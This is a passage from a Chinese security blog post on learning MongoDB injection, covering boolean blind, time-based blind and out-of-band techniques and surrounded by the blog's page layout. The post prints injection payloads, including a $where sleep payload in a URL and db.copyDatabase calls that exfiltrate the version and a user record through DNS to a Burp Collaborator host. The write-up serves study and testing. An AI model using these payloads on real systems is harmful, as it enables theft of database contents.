+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>以一个例子说明，注册一个用户名为cc<strong>true</strong>,这里的功能是根据上传的用户名，查询所管理的机器（没有越权）</p>
+<p>当传上去的用户名正常的时候</p>
+<p>当不存在用户名，或者身份验证失败的时候</p>
+<p><img src="bool1.png" alt="bool1.png"></p>
+<p><img src="boo2.png" alt="boo2.png"></p>
+<p>测试出注入点</p>
+<p>盲注思路是用表达式的结果为true时和cc相加重新变成用户名ccture</p>
+<p><img src="bool3.png" alt="bool3.png"></p>
+<p>确认版本信息</p>
+<p>同样可以用于bool盲注还有$regix操作符</p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>给个demo<br><code>db.users.find({&#39;$where&#39;:&#39;function() {sleep(5000);}&#39;})</code></p>
+<p>在数组绑定的代码下实验这个demo,发现因为mongodb或者php驱动的限制，不能正常用<br><code>http://192.168.62.151/mongo.php?username=cl0und&amp;password[$where]=function(){return%20sleep((5000);}</code></p>
+<h2 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h2><p>实际没有用过，仅仅作一种探索</p>
+<p>查看版本<br><code>db.copyDatabase(&#39;cl0und&#39;,&#39;test&#39;,version()+&#39;.wssyoum9pyibk4uaukl9y0okxb31rq.burpcollaborator.net&#39;)</code></p>
+<p>因为查询出来的json格式有和url标准冲突的特殊字符所以需要剔除，还有每个文档一般都会有一个 _id ,z这个id也往往不那么重要所以也可以剔除。在看文档的想找到mongodb有关base64或者16进制的字符串转换方法，不过很可惜没有找到，所以做了一下的折中处理。</p>
+<p><img src="ofb.png" alt="ofb.png"><br><code>db.copyDatabase(&#39;cl0und&#39;,&#39;test&#39;,tojson(db.users.findOne({},{_id:0})).replace(new RegExp(&quot;:| |,|\&quot;|{|}&quot;,&quot;gm&quot;),&quot;&quot;)+&#39;.e2hvfklnuw3ciolc2r4s9hd9o0uqif.burpcollaborator.net&#39;)</code></p>
+<p><img src="ofb2.png" alt="ofb2.png"></p>
+<h2 id="留坑"><a href="#留坑" class="headerlink" title="留坑"></a>留坑</h2><ul>
+<li>多个mongodb节点数据不一致性</li>
+<li>CSRF</li>
+</ul>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>寒假快乐</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://drops.chamd5.org/#!/drops/405.Mongodb%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB" target="_blank" rel="noopener">http://drops.chamd5.org/#!/drops/405.Mongodb%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB</a></p>
+<p><a href="http://03i0.com/2017/10/17/mongodb%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://03i0.com/2017/10/17/mongodb%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/</a></p>
+<p><a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection" target="_blank" rel="noopener">https://www.owasp.org/index.php/Testing_for_NoSQL_injection</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>李三（cl0und）
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="MONGODB注入学习">http://yoursite.com/2018/01/12/MONGODB注入学习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql/" rel="tag"># sql</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2017/10/18/thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97gadget%20%E5%A4%8D%E7%8E%B0/" rel="prev" title="thinkphp 反序列化系列gadget 复现">
+      <i class="fa fa-chevron-left"></i> thinkphp 反序列化系列gadget 复现
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/" rel="next" title="记录一道题的多种解法">
+      记录一道题的多种解法 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#写在前面"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基本简单操作"><span class="nav-number">3.</span> <span class="nav-text">基本简单操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#主要说说查找"><span class="nav-number">4.</span> <span class="nav-text">主要说说查找</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注入姿势"><span class="nav-number">5.</span> <span class="nav-text">注入姿势</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#回显注入-数组绑定注入"><span class="nav-number">6.</span> <span class="nav-text">回显注入-数组绑定注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#回显注入-字符串拼接注入"><span class="nav-number">7.</span> <span class="nav-text">回显注入-字符串拼接注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#布尔盲注"><span class="nav-number">8.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#时间盲注"><span class="nav-number">9.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#带外注入"><span class="nav-number">10.</span> <span class="nav-text">带外注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#留坑"><span class="nav-number">11.</span> <span class="nav-text">留坑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#最后"><span class="nav-number">12.</span> <span class="nav-text">最后</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">13.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">李三（cl0und）</p>
+  <div class="site-description" itemprop="description">人若无名，便可专心练剑</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://7o8v.me/" title="http:&#x2F;&#x2F;7o8v.me&#x2F;" rel="noopener" target="_blank">7o8v☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://evoa.me/" title="https:&#x2F;&#x2F;evoa.me&#x2F;" rel="noopener" target="_blank">evoA☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://kkdlong.win/" title="http:&#x2F;&#x2F;kkdlong.win&#x2F;" rel="noopener" target="_blank">kkdlong☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.l0ca1.xyz/" title="https:&#x2F;&#x2F;blog.l0ca1.xyz&#x2F;" rel="noopener" target="_blank">l0cal☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.lmxspace.com/" title="http:&#x2F;&#x2F;www.lmxspace.com&#x2F;" rel="noopener" target="_blank">l1nk3r</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/iamstudy/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;iamstudy&#x2F;" rel="noopener" target="_blank">l3m0n☘️</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://8sec.cc/" title="http:&#x2F;&#x2F;8sec.cc&#x2F;" rel="noopener" target="_blank">裤衩哥的小屋</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://abcdefghijklmnopqrst.xyz/" title="http:&#x2F;&#x2F;abcdefghijklmnopqrst.xyz" rel="noopener" target="_blank">骑麦兜看落日☘️</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">李三（cl0und）</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="Symbols count total">153k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">2:19</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.1.1
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v7.6.0
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
